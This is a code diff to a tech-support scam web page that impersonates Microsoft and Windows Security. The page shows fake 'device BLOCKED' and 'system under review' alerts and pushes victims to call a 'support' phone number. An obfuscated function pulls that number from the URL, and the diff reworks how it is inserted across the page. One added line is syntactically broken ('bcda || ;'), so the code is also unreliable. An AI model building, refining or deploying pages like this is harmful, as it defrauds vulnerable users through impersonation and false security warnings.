@@ -15,15 +15,24 @@
     <script>
 		function feewfewcwevwevewfwefewfew(name) {
 			name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
-			var regexS = "[\?&]" + name + "=([^&#]*)";
+			var regexS = "[\\?&]" + name + "=([^&#]*)";
 			var regex = new RegExp(regexS);
 			var results = regex.exec(window.location.href);
-			if (results == null)
+			if (results == null) {
 				return "";
-			else
-				return results[1];
+			} else {
+				return decodeURIComponent(results[1].replace(/\+/g, ' '));
+			}
 		}
 		var bcda = feewfewcwevwevewfwefewfew('bcda');
+
+		window.onload = function () {
+			var phone = bcda || ;
+			var phones = document.querySelectorAll(".support-phone");
+			phones.forEach(function (span) {
+				span.textContent = phone;
+			});
+		};
 	</script>
     <link rel="stylesheet" href="IZE7l1WWO2DU.css" />
     <style type="text/css">
@@ -180,7 +189,7 @@
                         <img src="JhPTQWjeygfO.png" /> Windows_security
                     </span>
                     <span style="font-weight: 500; padding-left: 13px; color: #fff">
-                        Windows Support <span style="border: 1px solid #fff; border-radius: 5px; padding: 2px 5px"><span class="support-phone"><script>document.write(bcda)</script></span></span>
+                        Windows Support <span style="border: 1px solid #fff; border-radius: 5px; padding: 2px 5px"><span class="support-phone"></span></span>
                     </span>
                 </div>
             </div>
@@ -218,7 +227,7 @@
         <div id="disclaimer" style="color: #0F396D">
             For help, please contact support.<br />
             <span class="Support" style="font-size: 22px">
-                Windows Support <span style="border: 1px solid #114d9a; border-radius: 5px; padding: 2px 5px"><span class="support-phone"><script>document.write(bcda)</script></span></span>
+                Windows Support <span style="border: 1px solid #114d9a; border-radius: 5px; padding: 2px 5px"><span class="support-phone"></span></span>
             </span>
         </div>
         <div id="bottom">
@@ -244,7 +253,7 @@
         <p>Call support for guided assistance over the phone.</p>
         <p>Windows Support team is here to help ensure your security.</p>
         <p style="padding-bottom: 0; color: #000; font-size: 16px">
-            Support contact: <strong><span style="border: 1px solid #000; border-radius: 5px; padding: 2px 5px"><span class="support-phone"><script>document.write(bcda)</script></span></span></strong>
+            Support contact: <strong><span style="border: 1px solid #000; border-radius: 5px; padding: 2px 5px"><span class="support-phone"></span></span></strong>
         </p>
         <div class="action_buttons">
             <a class="active" id="leave_page" style="cursor: pointer; color: #000 !important">Allow</a>
@@ -255,7 +264,7 @@
         <p style="color: #FFFFFF; margin-top: 10px; font-size: 16px; opacity: .9; padding: 0 5px" class="text-center">
             Security Notice: Your system is under review for any potential issues. Please avoid restarting or making significant changes until scans are complete.
             For immediate help, contact a Windows security expert.<br />
-            <strong>Windows Support: <span style="border: 1px solid #383d41; border-radius: 5px; padding: 2px 5px"><span class="support-phone"><script>document.write(bcda)</script></span></span></strong>
+            <strong>Windows Support: <span style="border: 1px solid #383d41; border-radius: 5px; padding: 2px 5px"><span class="support-phone"></span></span></strong>
         </p>
     </div>
     <div id="chrome-alerts" class="chrome-alert" style="padding-top: 10px; cursor: pointer">
@@ -275,12 +284,10 @@
         <span style="color: #222; font-size: 24px; font-weight: 600; margin-left: 6px; position: relative; top: 5px">Microsoft</span>
         <br />
         <p>Windows Technical Support</p>
-        <h4 style="font-weight: 600; color: #0F396D; font-size: 22px"><span class="support-phone"><script>document.write(bcda)</script></span><br />(Toll-free number)<br /><br /></h4>
+        <h4 style="font-weight: 600; color: #0F396D; font-size: 22px"><span class="support-phone"></span><br />(Toll-free number)<br /><br /></h4>
         <div class="arrow-down">
             <svg height="1em" viewBox="0 0 320 512" style="fill: #fff">
-                <path
-                    d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"
-                ></path>
+                <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
             </svg>
         </div>
     </div>
@@ -295,7 +302,7 @@
             <strong>City: <span id="city" style="color: #fff;">New York</span></strong><br />
 
             <strong>Your device is BLOCKED due to suspicious activity in <span id="region" style="color: #fff; font-size: 16px;">Washington</span></strong><br />
-            <strong>Contact Microsoft Windows Support: <span class="support-phone"><script>document.write(bcda)</script></span></strong>
+            <strong>Contact Microsoft Windows Support: <span class="support-phone"></span></strong>
         </p>
         <form method="post" action="#">
             <input type="text" name="name" id="name" placeholder="Username" class="text-input" required oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" /><br />
